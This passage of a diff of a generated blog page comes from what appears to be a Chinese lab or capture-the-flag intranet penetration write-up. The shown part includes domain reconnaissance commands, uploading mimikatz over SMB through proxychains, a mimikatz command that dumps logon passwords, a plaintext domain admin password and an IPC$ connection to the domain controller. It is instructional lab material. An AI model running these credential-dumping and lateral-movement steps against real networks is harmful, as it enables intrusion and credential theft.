 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br><span class="line">tasklist -V</span><br><span class="line">net view </span><br><span class="line">net view /domain</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">域控是192.168.93.10 </span><br><span class="line">域内有三台机器  \\WIN-8GA56TNV3MV                                                              </span><br><span class="line">                \\WIN2008                                                                      </span><br><span class="line">                \\WIN7    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="使用smbclient上传mimikatz"><a href="#使用smbclient上传mimikatz" class="headerlink" title="使用smbclient上传mimikatz"></a>使用smbclient上传mimikatz</h4><p><code>proxychains4 smbclient //192.168.93.20/C$ -U administrator</code></p>
+<h4 id="使用smbclient上传mimikatz">使用smbclient上传mimikatz</h4>
+<p><code>proxychains4 smbclient //192.168.93.20/C$ -U administrator</code></p>
 <p><img src="/posts/2ce9ab7f/smbclient.png"></p>
-<p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; 1.log</code></p>
+<p><code>mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" "exit" &gt; 1.log</code></p>
 <p><img src="/posts/2ce9ab7f/logonpasswords.png"></p>
-<p>得到域控账号密码 <code>Administrator</code>   <code>zxcASDqw123!!</code></p>
-<h4 id="使用ipc连接域控"><a href="#使用ipc连接域控" class="headerlink" title="使用ipc连接域控"></a>使用ipc连接域控</h4><p><code>net use \\192.168.93.10\ipc$ zxcASDqw123!! /user:&quot;TEST\Administrator&quot;</code></p>
+<p>得到域控账号密码 <code>Administrator</code>
+<code>zxcASDqw123!!</code></p>
+<h4 id="使用ipc连接域控">使用ipc连接域控</h4>
+<p><code>net use \\192.168.93.10\ipc$ zxcASDqw123!! /user:"TEST\Administrator"</code></p>
 <p><img src="/posts/2ce9ab7f/ipc_flag.png"></p>
 <p>得到flag</p>
 
@@ -611,7 +641,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#nmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.1.</span> <span class="nav-text">nmap端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">2.2.</span> <span class="nav-text">目录扫描</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%99%BB%E5%BD%95mysql%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7"><span class="nav-number">3.1.</span> <span class="nav-text">登录mysql创建用户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Getshell"><span class="nav-number">3.2.</span> <span class="nav-text">Getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#disable-functions%E7%BB%95%E8%BF%87"><span class="nav-number">3.3.</span> <span class="nav-text">disable_functions绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%9A%81%E5%89%91disable-functions%E6%8F%92%E4%BB%B6"><span class="nav-number">3.3.1.</span> <span class="nav-text">蚁剑disable_functions插件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8LD-PRELOAD%E7%BB%95%E8%BF%87"><span class="nav-number">3.3.2.</span> <span class="nav-text">使用LD_PRELOAD绕过</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.4.</span> <span class="nav-text">敏感信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="nav-number">3.5.</span> <span class="nav-text">脏牛提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-number">4.</span> <span class="nav-text">内网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E7%BA%BFMSF"><span class="nav-number">4.1.</span> <span class="nav-text">上线MSF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="nav-number">4.2.</span> <span class="nav-text">添加路由</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86"><span class="nav-number">4.3.</span> <span class="nav-text">设置代理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-number">4.4.</span> <span class="nav-text">存活主机探测</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8icmp%E5%8D%8F%E8%AE%AE%E6%8E%A2%E6%B5%8B%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="nav-number">4.4.1.</span> <span class="nav-text">利用icmp协议探测存活主机</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#smb%E6%89%AB%E6%8F%8F"><span class="nav-number">4.4.2.</span> <span class="nav-text">smb扫描</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="nav-number">4.5.</span> <span class="nav-text">内网主机端口探测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="nav-number">4.6.</span> <span class="nav-text">漏洞扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4"><span class="nav-number">4.7.</span> <span class="nav-text">弱口令爆破</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8wmi%E8%BF%9E%E6%8E%A5shell"><span class="nav-number">4.8.</span> <span class="nav-text">使用wmi连接shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8smbclient%E4%B8%8A%E4%BC%A0mimikatz"><span class="nav-number">4.9.</span> <span class="nav-text">使用smbclient上传mimikatz</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8ipc%E8%BF%9E%E6%8E%A5%E5%9F%9F%E6%8E%A7"><span class="nav-number">4.10.</span> <span class="nav-text">使用ipc连接域控</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#nmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.1.</span> <span class="nav-text">nmap端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">2.2.</span> <span class="nav-text">目录扫描</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%99%BB%E5%BD%95mysql%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7"><span class="nav-number">3.1.</span> <span class="nav-text">登录mysql创建用户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getshell"><span class="nav-number">3.2.</span> <span class="nav-text">Getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#disable_functions%E7%BB%95%E8%BF%87"><span class="nav-number">3.3.</span> <span class="nav-text">disable_functions绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%9A%81%E5%89%91disable_functions%E6%8F%92%E4%BB%B6"><span class="nav-number">3.3.1.</span> <span class="nav-text">蚁剑disable_functions插件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8ld_preload%E7%BB%95%E8%BF%87"><span class="nav-number">3.3.2.</span> <span class="nav-text">使用LD_PRELOAD绕过</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.4.</span> <span class="nav-text">敏感信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="nav-number">3.5.</span> <span class="nav-text">脏牛提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-number">4.</span> <span class="nav-text">内网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E7%BA%BFmsf"><span class="nav-number">4.1.</span> <span class="nav-text">上线MSF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="nav-number">4.2.</span> <span class="nav-text">添加路由</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86"><span class="nav-number">4.3.</span> <span class="nav-text">设置代理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-number">4.4.</span> <span class="nav-text">存活主机探测</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8icmp%E5%8D%8F%E8%AE%AE%E6%8E%A2%E6%B5%8B%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="nav-number">4.4.1.</span> <span class="nav-text">利用icmp协议探测存活主机</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#smb%E6%89%AB%E6%8F%8F"><span class="nav-number">4.4.2.</span> <span class="nav-text">smb扫描</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="nav-number">4.5.</span> <span class="nav-text">内网主机端口探测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="nav-number">4.6.</span> <span class="nav-text">漏洞扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4"><span class="nav-number">4.7.</span> <span class="nav-text">弱口令爆破</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8wmi%E8%BF%9E%E6%8E%A5shell"><span class="nav-number">4.8.</span> <span class="nav-text">使用wmi连接shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8smbclient%E4%B8%8A%E4%BC%A0mimikatz"><span class="nav-number">4.9.</span> <span class="nav-text">使用smbclient上传mimikatz</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8ipc%E8%BF%9E%E6%8E%A5%E5%9F%9F%E6%8E%A7"><span class="nav-number">4.10.</span> <span class="nav-text">使用ipc连接域控</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -627,7 +657,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -675,7 +705,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -689,7 +719,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -700,7 +730,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -840,6 +870,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
